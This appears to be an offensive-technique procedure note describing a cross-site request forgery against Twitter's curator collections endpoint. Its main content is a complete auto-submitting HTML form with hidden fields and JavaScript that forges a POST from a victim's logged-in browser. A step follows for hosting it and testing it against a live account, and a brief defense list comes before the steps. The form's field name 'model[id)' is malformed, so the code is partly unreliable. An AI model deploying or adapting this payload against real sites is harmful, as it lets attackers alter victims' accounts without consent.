---
tags:
  - csrf
  - html
  - javascript
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:35.877Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 102532c9-b4d3-40ba-b7fe-a4349ab95aaf
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft-Malicious-HTML-Form-for-Twitter-CSRF

## Summary

This procedure details creating an HTML page with an auto-submitting form to exploit the CSRF vulnerability in Twitter's collections endpoint, forging a POST request to add unwanted tweets using the victim's session.

## Description

The attack leverages a simple HTML form with hidden fields mimicking legitimate parameters, combined with JavaScript for automatic submission on load. Targeted at https://curator.twitter.com/api/collections/STREAM/content, it includes tweet_ids[] for the attacker's chosen tweet (e.g., '667977435124658176'), collections[] for the victim's ID, and model[id] as 'STREAM'. This executes in the victim's browser, using their cookies for authentication. Prerequisites: Known endpoint and parameters from reconnaissance. Outcomes include unauthorized collection modification, potentially for spam or disruption.

## Requirements

1. Text editor for HTML/JS creation
2. Hosting capability for the malicious page (e.g., free web host)
3. Victim's collection ID and target tweet ID

## Defense

Defensive measures and detection strategies:

- Enforce same-origin policy and CSRF tokens
- Browser extensions like NoScript to block auto-submits
- Log and alert on rapid or anomalous collection changes

## Objectives

1. Build a stealthy, auto-executing CSRF payload
2. Ensure compatibility with victim's authenticated session
3. Test for successful unauthorized addition

## Instructions

### Step 1: Write the HTML Form

**Context**: Create the base form structure with hidden inputs for required parameters.

In a text editor, author the following HTML:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf-form" action="https://curator.twitter.com/api/collections/STREAM/content" method="POST">
    <input type="hidden" name="tweet_ids[]" value="667977435124658176">
    <input type="hidden" name="collections[]" value="VICTIM_COLLECTION_ID">
    <input type="hidden" name="model[id)" value="STREAM">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
</body>
</html>
```

Replace VICTIM_COLLECTION_ID with the actual ID. This form auto-submits on load.

**Expected Output**: Valid HTML file ready for hosting.

### Step 2: Test the Payload

**Context**: Verify the form submits correctly in an authenticated browser.

Host the file locally or online, load it while logged into Twitter, and check if the tweet is added to the collection.

**Expected Output**: Tweet appears in collection without manual input.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[html]]
- [[JavaScript]]
